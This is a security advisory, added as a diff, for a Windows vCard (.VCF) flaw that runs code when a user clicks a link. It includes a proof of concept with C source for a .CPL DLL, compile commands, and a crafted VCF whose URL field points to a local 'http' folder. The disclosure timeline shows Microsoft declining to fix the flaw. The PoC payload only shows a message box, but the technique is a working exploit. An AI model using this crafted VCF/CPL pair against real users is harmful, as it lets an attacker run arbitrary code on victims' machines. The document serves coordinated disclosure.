@@ -1,0 +1,160 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-VCF-FILE-INSUFFICIENT-WARNING-REMOTE-CODE-EXECUTION.txt
+[+] ISR: ApparitionSec   
+[+] Zero Day Initiative Program
+
+
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+A VCF file is a standard file format for storing contact information for a person or business.
+Microsoft Outlook supports the vCard and vCalendar features. These are a powerful new approach to electronic Personal Data Interchange (PDI).
+
+
+
+[Vulnerability Type]
+Insufficient UI Warning Remote Code Execution
+
+
+
+[CVE Reference]
+ZDI-19-013
+ZDI-CAN-6920
+
+
+[Security Issue]
+This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Microsoft Windows.
+User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.
+
+The specific flaw exists within the processing of VCard files. Crafted data in a VCard file can cause Windows to display a dangerous hyperlink.
+The user interface fails to provide any indication of the hazard.
+
+An attacker can leverage this vulnerability to execute code in the context of the current user.
+
+
+[Exploit/POC]
+1) create a directory and name it "http" this will house the .CPL executable file.
+
+
+2) create a .CPL file and give it a website name, I named mine "www.hyp3rlinx.altervista.cpl" 
+or whatever website you wish so it can be referenced in the VCF file.
+
+#include <windows.h>
+
+/* hyp3rlinx */
+
+/*
+gcc -c -m32 hyp3rlinx.altervista.c
+gcc -shared -m32 -o hyp3rlinx.altervista.cpl hyp3rlinx.altervista.o
+*/
+
+void ms_vcf_0day(){
+	 MessageBox( 0, "Continue with install?" , "TrickyDealC0der " , MB_YESNO + MB_ICONQUESTION );
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
+	switch(fdwReason){
+		case DLL_PROCESS_ATTACH:{
+			 ms_vcf_0day();
+			break;
+		}
+		case DLL_PROCESS_DETACH:{
+			 ms_vcf_0day();
+			break;
+		}
+		case DLL_THREAD_ATTACH:{
+			 ms_vcf_0day();
+			break;
+		}
+		case DLL_THREAD_DETACH:{
+			 ms_vcf_0day();
+			break;
+		}
+	}
+	
+  return TRUE;
+}
+
+
+
+3) make sure to rename the executable .DLL extension to a .CPL extension if you did not follow compile instructions above to output as ".CPL".
+e.g. hyp3rlinx.altervista.dll --> hyp3rlinx.altervista.cpl
+
+
+
+4) Create .VCF mail file I named mine "trickyDealC0der.vcf"
+
+For the URL in the .VCF Mail file specify a URL like...
+URL;TYPE=home;PREF=1:http.\\www.hyp3rlinx.altervista.cpl
+
+The Windows .VCF File content:
+
+"trickyDealC0der.vcf"
+
+BEGIN:VCARD
+VERSION:4.0
+N:Tricky;DealC0der;;;
+FN:TrickyDealC0der
+EMAIL;TYPE=home;PREF=1:M$@PwnedAgain.com
+TEL;TYPE="cell,home";PREF=1:tel:+000-000-0000
+ADR;TYPE=home;PREF=1:;;1 NYC;NY;;WC2N;USA
+URL;TYPE=home;PREF=1:http.\\www.hyp3rlinx.altervista.cpl
+END:VCARD
+
+
+
+Now, open the "trickyDealC0der.vcf" file and click the website link, the VCF file will traverse back one to the "http" directory where
+our CPL executable file lives and KABOOM! 
+
+
+
+[References]
+https://www.zerodayinitiative.com/advisories/ZDI-19-013/
+
+
+
+[Network Access]
+Remote
+
+
+
+[POC Video URL]
+https://vimeo.com/310684003
+
+
+
+[Disclosure Timeline]
+Notification: Trend Micro Zero Day Initiative Program
+2018-07-23 - Vulnerability reported to vendor
+2019-01-10 - Coordinated public release of advisory
+2019-01-10 - Advisory Updated
+
+ADDITIONAL DETAILS	
+08/06/18 - ZDI reported the vulnerability to the vendor
+08/07/18 - The vendor acknowledged the report and provided a tracking #
+10/01/18 – The vendor requested an additional file
+10/03/18 – ZDI provided added files and a new PoC
+10/03/18 – The vendor advised the report did not meet the bar for service
+10/05/18 – ZDI advised that we believe the report is exploitable and notified the vendor of the intent to 0-day on 10/16/18
+10/08/18 – The vendor advised ZDI they had re-considered a fix and requested an extension to 01/08/19
+10/09/18 – ZDI agreed to the short extension
+11/14/18 – The vendor again advised ZDI of the target patch date 01/08/19
+12/12/18 – The vendor provided ZDI a CVE
+12/19/18 - The vendor wrote to ZDI to advise that “engineering team had decided to pursue the fix as v.Next” and “Microsoft has decided that it will not be fixing this vulnerability and we are closing this case”
+12/27/18 – ZDI notified the vendor of the intent to 0-day on 01/07/18
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
